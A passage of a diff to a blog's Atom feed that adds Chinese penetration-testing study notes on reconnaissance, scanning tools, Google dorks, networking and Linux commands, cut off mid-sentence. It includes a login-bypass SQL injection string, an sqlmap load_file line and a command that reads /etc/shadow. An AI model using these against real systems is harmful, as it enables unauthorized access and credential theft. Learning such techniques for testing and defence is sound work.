@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="prayer007007.github.io/"/>
-  <updated>2018-09-07T07:18:59.335Z</updated>
+  <updated>2018-09-09T12:07:04.943Z</updated>
   <id>prayer007007.github.io/</id>
   
   <author>
@@ -17,62 +17,964 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>third</title>
-    <link href="prayer007007.github.io/2018/09/06/third/"/>
-    <id>prayer007007.github.io/2018/09/06/third/</id>
-    <published>2018-09-06T02:20:07.000Z</published>
-    <updated>2018-09-07T07:18:59.335Z</updated>
+    <title>渗透测试学习笔记07-信息收集</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B007-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记07-信息收集/</id>
+    <published>2018-09-09T20:06:24.000Z</published>
+    <updated>2018-09-09T12:07:04.943Z</updated>
     
-    <content type="html"><![CDATA[<p>hello this is the third title;<br>666666666<br>666666666666666666666666666<br>666666666<br>666666666<br>666666666<br><a id="more"></a><br>这里需要点击全部显示才能显示!<br>123</p>]]></content>
+    <content type="html"><![CDATA[<pre><code>信息收集    域名信息    整站分析    敏感目录    谷歌 hacker    端口扫描    URL采集    旁站C段        信息分析    域名信息        对应IP收集            相关域名对应IP,相关工具:nslookup,一些工具网站        子域名收集            工具:layer,subDomainBrute        whois(注册人)信息查询            根据已知域名反查,分析出此域名的注册人,邮箱,电话等.            工具:爱站网,站长工具,微步在线(https://x.threatbook.cn)            site.ip138.com,searchdns.netcraft.com</code></pre><a id="more"></a>                <pre><code>敏感目录    收集方向        robots.txt,后台目录,安装包,上传目录,mysql管理接口,安装页面,        phpinfo,编辑器,iis短文件    常用工具        字典爆破-&gt;御剑,dirbuster,wwwscan,IIS_shortname_Scanner等        蜘蛛爬行-&gt;爬行菜刀,webrobot,burp等    端口扫描        nmap,portscan,ntscan,telnet        21-&gt;FTP        22-&gt;SSH        23-&gt;Telnet        110-&gt;POP3        1433-&gt;Sqlserver        3306-&gt;Mysql        3389-&gt;Mstsc        8080-&gt;Tomcat/jboss        9090-&gt;WebSphere等旁站C段    旁站:同服务器其他站点    C段:同一网段其他服务器    常用工具:        web-&gt;K8旁站,御剑1.5        端口-&gt;portscan整站分析    服务器类型        服务器平台,版本等    网站容器        搭建网站的服务组件,reg:iis,Apache,nginx,tomcat    脚本类型        ASP,PHP,JSP,aspx等    数据库类型        access,sqlserver,mysql,oracle,postgresql等    CMS类型    WAF谷歌hacker    1.Intext    查找网页中含有xx关键字的网站 reg:Intext:管理员登录    2.Intitle    查找某个标题    reg:intitle:后台登录    3.Filetype    查找某个文件类型的文件    reg:数据挖掘filetype:doc    4.Inurl    查找url中带有某字段的网站    reg:inurl:php?id=    5.Site    在某域名中查找信息URL采集    采集相关url的同类网站    例如:        php?id=        漏洞网站        相同某种指纹网站    常用工具    谷歌hacker    url采集器后台查找    1.弱口令默认后台:admin,admin/login.asp,manage,login.asp等等 常见的后台    2.查看网页的链接:一般来说,网站的主页有管理登陆类似的东西,有些可能被管理员删掉    3.查看网站图片的属性    4.查看网站使用的管理系统,从而确定后台    5.用工具查找:wwwscan,intellitamaper,御剑    6.robots.txt的帮助:robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看    7.GoogleHacker    8.查看网站使用的编辑器是否有默认后台    9.短文件利用    10.sqlmap-sql-shell load_file(&apos;d:/wwroot/index.php&apos;);CDN绕过方法    什么是CDN    如何判断网站有没有使用CDN(超级ping)    1.查找二级域名    2.让服务器主动给你发包(邮件)    3.敏感文件泄露    5.查询历史解析ip    访问绕过cdn        修改hosts文件</code></pre>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;hello this is the third title;&lt;br&gt;666666666&lt;br&gt;666666666666666666666666666&lt;br&gt;666666666&lt;br&gt;666666666&lt;br&gt;666666666&lt;br&gt;
+      &lt;pre&gt;&lt;code&gt;信息收集
+    域名信息    整站分析
+    敏感目录    谷歌 hacker
+    端口扫描    URL采集
+    旁站C段        信息分析
+
+    域名信息
+        对应IP收集
+            相关域名对应IP,相关工具:nslookup,一些工具网站
+        子域名收集
+            工具:layer,subDomainBrute
+        whois(注册人)信息查询
+            根据已知域名反查,分析出此域名的注册人,邮箱,电话等.
+            工具:爱站网,站长工具,微步在线(https://x.threatbook.cn)
+            site.ip138.com,searchdns.netcraft.com
+&lt;/code&gt;&lt;/pre&gt;
     
     </summary>
     
-      <category term="编程" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
     
-      <category term="后端" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
     
-      <category term="PHP" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/PHP/"/>
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
     
-      <category term="其他" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/PHP/%E5%85%B6%E4%BB%96/"/>
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="php" scheme="prayer007007.github.io/tags/php/"/>
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
   <entry>
-    <title>second_article</title>
-    <link href="prayer007007.github.io/2018/09/01/second-article/"/>
-    <id>prayer007007.github.io/2018/09/01/second-article/</id>
-    <published>2018-09-01T02:02:05.000Z</published>
-    <updated>2018-09-07T07:18:59.337Z</updated>
+    <title>渗透测试学习笔记03-06(9)-工具网站与万能秘钥</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-9-%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99%E4%B8%8E%E4%B8%87%E8%83%BD%E7%A7%98%E9%92%A5/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-9-工具网站与万能秘钥/</id>
+    <published>2018-09-09T20:04:20.000Z</published>
+    <updated>2018-09-09T12:05:03.983Z</updated>
     
-    <content type="html"><![CDATA[<p>这里是测试专用，没必要看</p><p>hello this is the second title;<br>123456</p><font color="#FF0000"> 我可以设置这一句的颜色哈哈 </font><br><font size="6"> 我还可以设置这一句的大小嘻嘻 </font><br><font size="5" color="#FF0000"> 我甚至可以设置这一句的颜色和大小呵呵</font><p><center>这一行需要居中</center><br><a id="more"></a><br>这里需要点击全部显示才能显示!<br>123</p>]]></content>
+    <content type="html"><![CDATA[<pre><code>工具网站:    www.exploit-db.com    www.sebug.net    Acunetix Web Vulnerability Scanner    IBM Security AppScan    Nessus    Metasploit</code></pre><a id="more"></a>        <pre><code>利用互联网收集信息1.&quot;Google hack&quot;site:www.nsfocus.com inurl:admin filetype:action2.万能的&quot;站长工具&quot;tool.chinaz.com3.自己的双手也很神奇    查找关键字    Power by DEDECMS    源码的注释    网站报错信息    网站版本页面    robot.txt    敏感目录    ...万能秘钥:    用户名:&apos;or&apos;=&apos;or&apos;    密码:&apos;or&apos;=&apos;or&apos;    一般用于ASP</code></pre>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;这里是测试专用，没必要看&lt;/p&gt;
-&lt;p&gt;hello this is the second title;&lt;br&gt;123456&lt;/p&gt;
-&lt;font color=&quot;#FF0000&quot;&gt; 我可以设置这一句的颜色哈哈 &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;6&quot;&gt; 我还可以设置这一句的大小嘻嘻 &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;5&quot; color=&quot;#FF0000&quot;&gt; 我甚至可以设置这一句的颜色和大小呵呵&lt;/font&gt;
-
-&lt;p&gt;&lt;center&gt;这一行需要居中&lt;/center&gt;&lt;br&gt;
+      &lt;pre&gt;&lt;code&gt;工具网站:
+    www.exploit-db.com
+    www.sebug.net
+    Acunetix Web Vulnerability Scanner
+    IBM Security AppScan
+    Nessus
+    Metasploit
+&lt;/code&gt;&lt;/pre&gt;
     
     </summary>
     
-      <category term="编程" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
     
-      <category term="Java" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/Java/"/>
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
     
-      <category term="其他" scheme="prayer007007.github.io/categories/%E7%BC%96%E7%A8%8B/Java/%E5%85%B6%E4%BB%96/"/>
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(8)-信息收集-爬虫-md5-nmap</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%88%AC%E8%99%AB-md5-nmap/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-8-信息收集-爬虫-md5-nmap/</id>
+    <published>2018-09-09T20:02:50.000Z</published>
+    <updated>2018-09-09T12:03:56.644Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>信息搜集-目录结构分析1.信息收集2.整站目录结构,数据库调用原理3.批量拿站讲解信息搜集:    dns收集        敏感目录    端口探测    谷歌黑客    子域探测    旁站探测    C段查询        整站识别    waf探测        工具网站</code></pre><a id="more"></a>        <pre><code>常用的系统:BackTrack    parrot(新出的)Kali(BT5现在版本)DNS收集    域名--ip    whois查询    站长工具    http://tool.chinaz.com/    netcraft    http://searchdns.netcraft.comDNS--ip查询    查询内容    查询工具    主机[A]记录    站长之家    别名[CNAME]    netcraft    主机信息[HINFO]    dnsenum    邮箱[MB]    dnswalk    邮件交换器[MX]    dig    指针记录[PTR]    lbd    服务记录[SRV]    # ns1.2.3.4...    表示解析DNS的服务器    # dnsenum baidu.com    搜集百度的dns和主机名 dns    # dns 然后按两下Tab键    # dnsmap baidu.com        # whois baidu.comwhois查询    (1)根据已知域名反查,分析出此域名的注册人,邮箱,电话等字段,执行以下(2)至(5)反查方式;    (2)根据已知域名WHOIS中的注册邮箱来反查得出其它域名WHOIS中注册邮箱与此相同的域名列表;    (3)根据已知域名WHOIS中的注册人来反查得出其它域名WHOIS中注册人与此相同的域名列表;    (4)根据已知域名WHOIS中的联系电话来反查得出其它域名WHOIS中联系电话与此相同的域名列表;    (5)其它反查方式:比如可以根据注册机构,传真,地址,注册商等等方式来反查.敏感目录收集    mysql管理接口        wwwscan    后台目录        御剑    上传目录        Cansina    phpinfo            burpsuit    robots.txt        webrobot    安装包            skipfish    安装页面        uniscan    爬行            websploit    reg:    http://www.qufutuan.com/robots.txt    直接注入代码查询敏感目录,这个是防止爬行的文件.    reg:    www.qufutuan.com/manage    御剑查找    cmd5.com    --查询MD5    cmd-&gt;    java.exe -jar C:\xxx.jar    爬虫需要有一个代理,在34:00时间段左右    进入websploit之后    # show modules    use web/dir_scanner     show options    run    namp核心功能:    主机发现(Host Discovery)    端口扫描(Port Scanning)    版本侦测(Version Detection)    操作系统侦测(OS detection)    防火墙/IDS规避(Firewall/IDS evasion)    NSE脚本引擎(Nmap Scripting Engine)    # nmap -sS xxx.xxx.xxx.xxx</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;信息搜集-目录结构分析
+
+1.信息收集
+2.整站目录结构,数据库调用原理
+3.批量拿站讲解
+
+信息搜集:
+    dns收集        敏感目录
+    端口探测    谷歌黑客
+    子域探测    旁站探测
+    C段查询        整站识别
+    waf探测        工具网站
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(7)-网络模型与路由器</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-7-%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-7-网络模型与路由器/</id>
+    <published>2018-09-09T20:01:26.000Z</published>
+    <updated>2018-09-09T12:02:18.657Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>1.网络架构,以及tcp/ip协议参数2.交换机,路由器的作用及配置3.交换机,路由器的攻击及登陆密码的破解网络架构    互联网组成:    小局域网,园区网,如果不上外网基本不用路由器    做数据包转发时用用到路由器或交换机    局域网-局域网之间用光纤,设备用路由器    互联网-&gt;(可以理解为)N多个园区网组成    网线100米,最佳传输不能超过75米</code></pre><a id="more"></a>        <pre><code>局域网特点和常用设备:    距离短    延迟小    传输速率高    传输可靠HUB    交换机(目前用的较多)    路由器光纤-&gt;猫-&gt;交换机(4口)-&gt;电脑光纤(电话线)-&gt;猫-&gt;电脑(仅一台)-&gt;拨号公司:光纤(电话线)-&gt;猫-&gt;交换机-&gt;电脑                 -&gt;交换机-&gt;电脑                 -&gt;交换机-&gt;电脑                 ......广播风暴-&gt;就是造成环路现象-&gt;上不去网广域网常用设备:    Modem(猫)    路由器    广域网交换机(处理核心流量)    接入服务器Internet发展历史:    1969年-&gt;    1983年-&gt;    ...    1991年底-&gt;《谢希仁,计算机网络基础,第5版》Internet的现状ISP:网通,电信等网络运营商ISP    ...    ISP    ISP   ...   ISP    区域性ISP            区域性ISP        国家或国家ISP         ↓            NAP(海底光纤)         ↓            国家或国家ISP网络世界的规则    网络    协议    网络标准:    数据通信标准分为两类:事实的和法定的    事实标准:未经组织团体承认但已在应用中被广泛使用和接受的就是事实标准(de facto standard)    法定标准:由官方认可的团体制定的标准称为法定标准(de jure standard)标准化组织:    国际标准化组织(ISO)    --&gt;reg:制定的OSR7层模型    电子电器工程师协会(IEEE)    美国国家标准局(ANSI)    电子工业协会(EIA/TIA)    国际电信联盟(ITU)    INTERNET工程任务委员会(IETF)分层网络模型:    Core    High-Speed Switching(核心层)(核心交换机)    Distribution     Policy-Based Connectivity(高级交换机在这运行)    Access    Local and Remote Workgroup Access(最低端)网络结构    Access 电脑-&gt;交换机    Distribution 交换机-&gt;(汇聚层)三层交换(配置策略)(A不访问B,B不访问A,等等)    Core 三层交换-&gt;核心网络交换    Core用途:高速交换整个区域的流量    Core-&gt;三层交换-&gt;路由器(外网)(服务器)(网通)TCP/IP参数OSI参考模型    OSI RM:开放系统互连参考模型(Open System Interconnection Reference Model)    OSI参考模型具有以下优点    简化了相关的网络操作    提供设备间的兼容性和标准接口    促进标准化工作    结构上可以分割    易于实现和维护OSI分层    应用层        7    表示层        6    5,6,7 叫高层:负责主机之间的数据传输    会话层        5    传输层        4    网络层        3    数据链路层    2    1,2,3,4 叫底层:负责网络数据传输    物理层        1OSI七层功能    应用层        7    --提供应用程序间通信(应用软件)    表示层        6    --处理数据格式,数据加密等()    会话层        5    --建立,维护和管理会话(QQ等会话)    传输层        4    --建立主机端到端连接(协议)    网络层        3    --寻址和路由选择(路由器)    数据链路层    2    --提供介质访问,链路管理等(交换机)    物理层        1    --比特流传输(网线,光纤,传的reg:虚拟的是0,1)TCP/IP协议栈        OSI                TCP/IP    应用层        7            应    表示层        6            用    会话层        5            层    传输层        4            传输层    网络层        3            网络层    数据链路层    2            网络    物理层        1            接口层    应用层    HTTP,Telnet,FTP,TFTP    --&gt;提供应用程序网络接口    传输层    TCP/UDP            --&gt;建立端到端连接    网络层    IP            --&gt;寻址和路由选择    数据链路层(交换机) Ethernet,802.3,PPP    --&gt;物理介质访问(只识别物理地址)    物理层    接口和线缆        --&gt;二进制数据流传输网关:网线-&gt;(外网IP)-&gt;路由器(内网IP:192.168.1.1)-&gt;交换机-&gt;PC 192.168.1.2,网关是192.168.1.1    202.1.1.100网关在这里就是路由器连接的内网IP1.2去访问1.5的过程:1.2数据包-&gt;交换机(仅识别Mac地址?)-&gt;给每个接口发送广播-&gt;1.5的接口返回广播交换机将每个接口写成mac-zp-&gt;然后找到1.5IP地址分为4类类别    最大网络数    A类:    126      0.0.0.0-127.255.255.255B类:    1638      128.0.0.0-191.255.255.255C类:    2097152   192.0.0.0-223.255.255.255D类:          一般不给PC用,给交换机或设备之间用TCP/IP模型的层间通信与数据封装    HostA                PDU    用户数据    应用层        TCP报头 上层数据    传输层        SegmentIP报头    上层数据    网络层        PacketLLC报头 上层数据 FCS    数据链路层    FrameMAC报头    上层数据 FCS    010101001010101        物理层        Bit数据解封装            HostB应用层        ↑    上层数据传输层        ↑    上层数据网络层        ↑    TCP+上层数据数据链路层    ↑    IP+TCP+上层数据物理层        ↑    LLC报头+IP+TCP+上层数据        ↑    010101001010101reg:HostAQQ数据包(封装过程)-&gt;应用层(UDP格式走)-&gt;IP报头(对方IP)-&gt;LLC报头()-&gt;Mac报头(交换机)-&gt;01010100101010-&gt;HostBMAC报头-&gt;LLC报头-&gt;IP报头-&gt;TCP报头-&gt;HostB物理层功能:    规定介质类型,接口类型,信令类型    规范在终端系统之间激活,维护和关闭物理链路的电气,机械,流程和功能等方面的要求物理层介质和物理层设备    物理层介质    -同轴电缆    -双绞线    -光纤    -无线电波    物理层设备    -中继器,集线器数据链路层功能网络层功能和设备网络层协议网络层地址--------------------------------------1.TCP/IP协议栈2.TCP/IP协议栈报文封装3.案例分析(看PPT)(看那个计算机网络基础)路由器的介绍:路由技术是Internet得以持续运转的关键所在.查找网关中的路由表,然后一步一步来的路由是指导IP报文发送的路径信息.IP路由过程(看PPT)路由器关键功能:    检查数据包的目的地    确定信息源    发现可能的路由    选择最佳路由    验证和维护路由信息路由的来源-链路层发现的路由[RTB]display ip routing-table (华为命令)[RTB]show ip ...(思科)路由的来源-动态路由协议发现的路由静态和动态路由静态路由:    由网络管理员手工指定的路由    当网络拓扑发生变化时,管理员需要手工更新静态路由动态路由:    路由器使用路由协议从其他路由器那里获悉的路由(rip协议)(思科Eigrp)(通用的,OSPF)    当网络拓扑发生变化时,路由器会自动更新路由信息.路由协议    路由协议是路由器之间交互信息的一种语言.路由器之间通过路由协议共享网络状态和网络可达性的一些信息 .    相互通信的双方必须使用同一种语言才能交互路由信息    路由协议定义了一套路由器之间通信时使用的规则    路由协议维护路由表,提供最佳转发路径.路由协议分类--作用范围    IGPs:RIP OSPF ISIS    EGPs:BGP    AS100            AS200    网通            路由协议分类--协议算法    根据协议算法分类    距离矢量路由选择协议(DIstance-Vector)        包括RIP和BGP.其中,BGP也被称为路径矢量协议(Path-Vector)    链路状态路由选择协议(Link-State)        又称为最短路径优先路由选择协议,包括OSPF和IS-IS路由表:[Quidway] display ip routing-tableRouting Tables:Destination/Mask  proto  pref  cost  Nexthop  Interface0.0.0.0/0     static   60     0  120.0.0.2    Serial0/0目标网络,      协议        开钥值  下一跳     从哪个接口出去0.0是任意网络    还有RIP        低,易执行          OSPF...8.0.0.0/8(8是子网掩码)子网掩码谁匹配的最多就走哪一行路由优先级(Preference)    当存在多个路由来源时,具有较高优先级(数值越小表明优先级越高)的路由来源提供的路由将被激活,用于指导报文的转发.    VRP缺省的路由优先级如下:    路由协议    优先级    DIRECT          0(最高)    OSPF          10    IS-IS          15    STATIC          60    RIP          100    OSPF ASE      150最长匹配原则:    查找路由表-&gt;目的地址与掩码分别做&quot;与&quot;操作-&gt;与路由表中的目的地址作比较-&gt;匹配-&gt;挑选出最长匹配项交换机    交换机(Switch)意为&quot;开关&quot;是一种用于电(光)信号转发的网络设备.它可以为接入交换机的    任意两个网络节点提供独享的电信号通路.最常见的交换机是以太网交换机.其他常见的还有电话语音交换机,光纤交换机等.交换机的工作模式    应用层                    应用层    表示层                    表示层    会话层                    会话层    传输层                    传输层    网络层        (二层交换机)        网络层    链路层        链路层-&gt;链路层        链路层    物理层        物理层-&gt;物理层        物理层</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;1.网络架构,以及tcp/ip协议参数
+2.交换机,路由器的作用及配置
+3.交换机,路由器的攻击及登陆密码的破解
+
+网络架构
+    互联网组成:
+    小局域网,园区网,如果不上外网基本不用路由器
+    做数据包转发时用用到路由器或交换机
+    局域网-局域网之间用光纤,设备用路由器
+    互联网-&amp;gt;(可以理解为)N多个园区网组成
+    网线100米,最佳传输不能超过75米
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试学习笔记03-06(6)-linux之vi与网络协议相关命令</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-6-linux%E4%B9%8Bvi%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
+    <id>prayer007007.github.io/2018/09/10/渗透测试学习笔记03-06-6-linux之vi与网络协议相关命令/</id>
+    <published>2018-09-09T20:00:02.000Z</published>
+    <updated>2018-09-09T12:00:59.628Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>vi是一个较大的unix命令,在启动的时候也有它自己的选项和参数基本语法:    vi [-options] [+[n]] [file]常用选项有:-r , -R    -r用于恢复系统突然崩溃时正在编辑的文件    -R用于以只读方式打开文件    +n用来指明进入vi后直接位于文件的第n行,如果不指定n,则位于最后一行# cp /etc/resolv.conf ss# cat ss# vi +3 ss    --光标停在第3行</code></pre><a id="more"></a>    <pre><code># vi ss        --光标停在第1行必须用一些命令来操作命令模式按dd        --删除本行按D        --删除从光标到行尾按p        --就粘贴回来按i        --在光标前面插入按A        --在行尾插入按R        --在行首插入按o        --在下一行插入按O        --在上一行插入按u        --返回上一步操作按22 + dd    --删除22行        --插入模式    按a        --进入插入模式按ESC        --退回原始模式就可以编辑了按ESC+shift+;    --进入底行模式(输入一些字符命令进行操作)输入q+回车    --退出模式(q+!)(强制退出)输入wq        --保存并退出输入w        --保存文本插入:在命令方式下使用某些命令会导致vi马上进入文本插入方式,这些命令包括:i,I,a,A,o,O等在这种方式下用户的任何输入都被当做是文件的内容看待,并将其显示在屏幕上a:在光标后附加文本A:在本行行末附加文本i:在光标前插入文本I:在本行开始插入文本o:在光标下插入新行O:在光标上插入新行搜索和替换:/string      --向前搜索指定字符串,搜索时忽略大小写:set icn      --搜索指定字符串的下一个出现位置:%s/old/new/g    --全文替换字符串:n1,n2s/old/new/g    --在一定范围内替换指定字符串按shift+:输入set nu    --显示行号/内容+回车    --搜索&quot;内容&quot;按n    --向下搜索?内容    --向上搜索按n    --向上搜索:%s/old内容/new内容/g    --全文替换:1,5s/old内容/new内容/g    --1,5行替换重复前一命令:.取消上一命令:u退出vi:行方式下使用q,行命令x相当于:wq命令.在命令方式下使用命令ZZ等效于:x命令如果由于读写权限或是更新方面的问题,导致vi拒绝执行保存文件或退出vi的命令,那么可以在命令后加一个!号表示强制执行cat命令:    cat    --显示出文件的全部内容    -n    --给输出的所有行加上编号    cat 1 2 &gt; 3    --合并文件    将文件1和2合并到3,如cat 1 2 3...&gt;n# cat /etc/passwdroot:x:0:0:root:/root:/bin/bash用户名:x代表影子密码,密码放在其他位置:UID号0基本代表管理员:GID号(组id):所在分组名称(家目录) /bin/bash:所使用的shell,bin下或bash下都能登录这个终端像sbin,nologin是不能登录终端的.密码存放位置:# cat /etc/shadow!! 代表没有密码        有密码的就MD5加密了用which命令查看cat命令在哪一目录下# which cat/bin/cat    --普通用户都能用# cat -n ss# date        --显示日期# date &gt; 1    --将date信息导入到1# cat 1# cat 1 ss # cat 1 ss &gt; 2# cat 2wc 统计文件中的单次数量 字节数 行数-l 统计行数-w 统计单词数-c 统计字符数wc sdxh.txt 会出现 2 4 26    2是行数    4是单词数 26是字符数history查看历史命令# wc -l ss归档和压缩命令 gzip bzip2    (多个文件归成1个文件)    只针对单个文件压缩或    -9 显示高压缩比    -d 释放压缩文件    gzip 文件名 压缩文件 格式为后缀有.gz    bzip2 文件名 压缩成的文件名 格式为 